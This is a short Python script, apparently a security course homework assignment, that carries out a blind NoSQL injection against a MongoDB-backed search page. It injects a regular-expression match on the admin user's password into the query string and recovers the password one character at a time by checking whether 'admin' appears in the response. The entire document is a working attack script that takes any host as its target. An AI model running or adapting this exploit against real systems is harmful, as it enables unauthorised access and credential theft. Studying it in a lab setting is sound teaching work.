#Alex Rose
#CS595 HW1
#2-17-19

import requests, sys, urllib
from bs4 import BeautifulSoup

searchlist = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

def try_password(url, password, chars):
    fullUrl = url + "/mongodb/example2/?search=admin%27%20%26%26%20this.password.match%28%2F%5E" + password + "%5B" + chars + "%5D.%2A%24%2F%29%2F%2F"
    session = requests.Session()
    response = session.get(fullUrl)
    soup = BeautifulSoup(response.content, 'html.parser')
    
    if(soup.body.findAll(text='admin')):
        return True
    else:
        return False

if len(sys.argv) != 2:
    print("Usage: alex_rose_hw1.py <url>")
    sys.exit(1)

victimUrl = "http://" + sys.argv[1] 

password = ""
found = False
while not found:
    for char in searchlist:
        if try_password(victimUrl, password, char):
            password += char
            print(password)
            break
        else:
            #print(searchlist + " is not in password!!!!!")
            if char == 'Z':
                found = True

print(password)

#url = "http://%s/mongodb/example2" % (sys.argv[1])
#args = "/?search=admin%27%20%26%26%20this.password.match(%2F%5e.*%2F)%2F%2F" 
#url += args
#session = requests.Session()

#response = session.get(url)

#soup = BeautifulSoup(response.content, 'html.parser')

#if soup.body.findAll(text='admin'):
#    print("admin found")
#else:
#    print("admin not found")

